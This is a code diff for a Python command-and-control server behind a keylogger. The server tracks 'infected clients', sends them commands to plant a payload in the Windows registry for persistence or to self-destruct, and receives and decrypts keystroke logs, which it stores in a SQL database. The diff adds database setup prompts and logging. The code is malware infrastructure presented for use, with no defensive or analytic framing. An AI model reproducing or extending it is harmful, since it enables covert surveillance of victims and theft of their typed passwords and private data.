@@ -1,5 +1,4 @@
 import base64
-import errno
 import os
 import socket
 import sys
@@ -14,6 +13,8 @@ from cryptography.hazmat.primitives.serialization import PublicFormat
 from cryptography.hazmat.primitives import serialization
 import datetime
 import time
+import json
+
 
 # *** Notes ***
 # Commands are being sent to client in the clear.
@@ -21,8 +22,10 @@ import time
 # The error with base 10 might be random due to the cycle of sending
 
 # *** Fix ***
-# Since new keys are being generated it does not work to decrypt local log files.
-# Use a static key for local files.
+# Modules that us ODBC to read/write client info.
+
+# *** Add ***
+# Add Json usage when user does not select to import a custom DB.
 
 date_format = '%Y-%m-%d %H:%M:%S'
 
@@ -34,19 +37,115 @@ class ControlCenter:
     server_port = 11111
     connections = 0
     header_size = 1024
+    use_database = False
     kill_switch_command = 'XXX'  # Kill switch to kill program from server.
     window_registry_command = 'WRG'
     self_destruct_command = 'DST' # Will self destruct the file.
-    database = control_database.Database()
+    database = None
+    database_info = None
     clients = list()  # List that will hold all clients.
     list_all_clients = 'L'  # Command to list the infected clients
-    commands_description = [f'[{kill_switch_command}] : TO KILL CLIENT PROGRAM', f'[{list_all_clients}] : LIST ALL CLIENTS',
+    commands_description = [f'[{kill_switch_command}] : TO KILL CLIENT SESSION', f'[{list_all_clients}] : LIST ALL CLIENTS',
                 f'[{window_registry_command}] : SET PAYLOAD INTO WINDOWS REGISTRY',
-                            f'[{self_destruct_command}] : SELF DESTRUCTS CLIENT PROGRAM']
+                            f'[{self_destruct_command}] : DELETES CLIENT PROGRAM OFF SYSTEM']
     commands = ['XXX', 'WRG', 'DST']  # Actual command codes.
 
     def __init__(self):
+        self.connect_database()
         pass
+
+    def time_stamp(self):
+        time_stamp = datetime.datetime.utcnow().isoformat(sep=" ", timespec='milliseconds')
+        return time_stamp
+
+    def connect_database(self):
+        connection_code = None
+        used_cookies = False
+        choice = input(f'DO YOU WANT TO CONNECT A CUSTOM DATABASE? [Y]:[N] ').upper()
+        self.database_cookie_read()
+        if choice == 'Y':
+            while connection_code != 0 and choice != 'N':
+                if self.database_info is None:
+                    help = input('DO YOU WANT TO PRINT THE INSTRUCTIONS ON SETTING UP A DATABASE? [Y]:[N] ').upper()
+                    if help == 'Y':
+                        print(
+                            'CREATE A DATABASE AND NAME IT [keylogger]. '
+                            'THE PROGRAM WILL THEN INITIALIZE THE TABLES IN THE DATABASE.\n'
+                            'YOU CAN FIND THE DRIVER INFO IN WINDOWS BY GOING TO: '
+                            'Administrative tools>ODBC Data Sources (32-bit)')
+
+                    odbc_driver = input(f'ENTER DRIVER (I.E. ODBC Driver 17 for SQL Server;): ')
+                    odbc_server = input(f'ENTER SERVER (I.E. DESKTOP - UCFQ6S6\SQLEXPRESS;): ')
+                    odbc_database = input(f'ENTER DATABASE NAME (I.E key_logger;): ')
+                    self.database_info = f"""
+                                    Driver={{{odbc_driver}}};
+                                    Server={odbc_server};
+                                    Database={odbc_database};
+                                    Trusted_Connection=yes;
+                                    """
+                else:
+                    used_cookies = True
+
+                self.database = control_database.Database()
+                connection_code = self.database.connect_custom(self.database_info)
+
+                if connection_code == 0:  # If database connected successfully.
+                    use_database = True
+                    print(f'CONNECTED TO: [{self.database_name()}]')
+                    if not used_cookies:
+                        self.database_cookie_write()
+
+                else:
+                    choice = input('CONNECTION FAILED. DO YOU WANT TO TRY AGAIN? [Y]:[N]').upper()
+                    self.database_info = None
+                    while choice != 'Y' and choice != 'N':
+                        choice = input('PLEASE ONLY ENTER [Y]:[N]').upper()
+
+        elif choice == 'N':
+            print('SORRY THIS FEATURE IS NOT CURRENTLY SUPPORTED')
+            exit(0)
+        else:
+            choice = input('PLEASE ENTER ONLY [Y]-YES OR [N]-NO').upper()
+
+    def database_name(self):
+        if self.database_info is None:
+            return
+        line = self.database_info.splitlines()
+        database = line[3]
+        database = database.lstrip()
+        database = database[9:-1]
+        return database
+
+
+    def database_cookie_write(self):
+        choice = None
+        while choice != 'Y' and choice != 'N':
+            choice = input('DO YOU WANT TO SAVE THIS DATABASE INFO? [Y]:[N]').upper()
+            if choice == 'Y':
+                database_cookie = open('database_cookies.txt', 'w')
+                database_cookie.write(self.database_info)  # Creates cookie to save database info
+                database_cookie.close()
+            elif choice == 'N':
+                return
+            else:
+                print('PLEASE ENTER CORRECT CHOICE')
+
+    def database_cookie_read(self):
+        try:  # If DB cookies were found ask user if he wishes to load that info
+            file_handle = open('database_cookies.txt', 'r')  # Reads for a database cookie
+            self.database_info = file_handle.read()
+            choice = input(f'A PREVIOUS CONNECTION WAS FOUND: \t{self.database_info}'
+                           f'\nDO YOU WANT TO LOAD THIS DATABASE INTO THE SESSION [Y]:[N]').upper()
+            if choice == 'Y':
+                file_handle.close()
+                return 0
+            else:
+                file_handle.close()
+                self.database_info = None
+                return 1
+        except FileNotFoundError:  # If no cookies were found.
+            return 1
+
 
     def control_station(self):  # Provides function of listing clients and sending commands.
         while True:
@@ -117,7 +216,7 @@ class ControlCenter:
         server_socket.bind((self.server_ip, self.server_port))
         server_socket.listen(5)
         print(f"SERVER LISTENING AT {self.server_ip}:{self.server_port}")
-        control_station = threading.Thread(target=start_program.control_station)
+        control_station = threading.Thread(target=control_center.control_station)
         control_station.start()
         while True:
             client, client_address = server_socket.accept()
@@ -126,12 +225,16 @@ class ControlCenter:
 
     def handle_connection(self, client, client_address):  # Handles the new connection from client.
         # is_loader()  # Will check if the connection is from a loader.
+        time_stamp = self.time_stamp()
         self.connections = self.connections + 1
         client_id = self.database.add_client(client_address)
+        print(f'[{time_stamp}] RECEIVED CONNECTION FROM CLIENT#: {client_id}')
         self.database.log_connection(client_id, 1)  # Logs user in
         self.clients.append((client_address, client))
         Client(client, client_address, client_id)
         self.database.log_connection(client_id, 0)  # Logs user out
+
+control_center = ControlCenter()
 
 class Client(ControlCenter):  # Client object for processing clients.
 
@@ -160,7 +263,7 @@ class Client(ControlCenter):  # Client object for processing clients.
                 log_payload = self.receive()
                 self.proccess_log(log_payload)
             except ValueError:  # If client disconnects or becomes unreachable.
-                time_stamp = datetime.datetime.now().strftime(self.date_format)
+                time_stamp = self.time_stamp()
                 print(f"[{time_stamp}] CLIENT DISCONNECTED FROM: {self.client_address}")
                 self.client_connected = False
         #  self.process_log(data.decode('utf-8'))
@@ -182,13 +285,13 @@ class Client(ControlCenter):  # Client object for processing clients.
 
     def receive(self):  # Receives data from client
         try:
-            incoming_payload_len = self.client.recv(ControlCenter.header_size)  # Gets payload size.
+            incoming_payload_len = self.client.recv(control_center.header_size)  # Gets payload size.
             time.sleep(.10)
             payload = self.client.recv(int(incoming_payload_len.decode('utf-8'))) # Gets payload
             return payload
         except ConnectionResetError:  # If client disconnects while listening.
-            time_stamp = datetime.datetime.now().strftime(self.date_format)
-            ControlCenter.clients.remove(self.client_address)
+            time_stamp = self.time_stamp()
+            control_center.clients.remove(self.client_address)
             self.client_connected = False  # Client is no longer connected.
             return
 
@@ -196,7 +299,7 @@ class Client(ControlCenter):  # Client object for processing clients.
         if not data:
             return
 
-        if data.decode() in ControlCenter.commands:  # If data is in command list its the client sending confirmation.
+        if data.decode() in control_center.commands:  # If data is in command list its the client sending confirmation.
             print(f'[{data.decode()}] COMMAND CONFIRMATION RECEIVED')
             return
 
@@ -205,7 +308,7 @@ class Client(ControlCenter):  # Client object for processing clients.
         if data == self.local_log_command:
             self.process_local_log()
             return
-        ControlCenter.database.write_log(self.client_id, data)
+        control_center.database.write_log(self.client_id, data)
         print(data)
 
 # Issue is that client is sending log line by line.
@@ -226,7 +329,7 @@ class Client(ControlCenter):  # Client object for processing clients.
             data = self.local_crypt_obj.decrypt(line.encode('utf-8')) # Decrypts local log using local key.
             temp_local_log_dec.write(data.decode('utf-8'))
             print(f'LOCAL DATA = {data.decode()}')
-            ControlCenter.database.write_log(self.client_id, data.decode())  # Writes each line of log to DB.
+            control_center.database.write_log(self.client_id, data.decode())  # Writes each line of log to DB.
         # Closes temp files below.
         temp_local_log_enc.close()
         temp_local_log_dec.close()
@@ -269,6 +372,5 @@ class Client(ControlCenter):  # Client object for processing clients.
     def check_for_command(self):  # Independent thread that reads commands from
         pass
 
-start_program = ControlCenter()
 
-start_program.start_server()
+control_center.start_server()
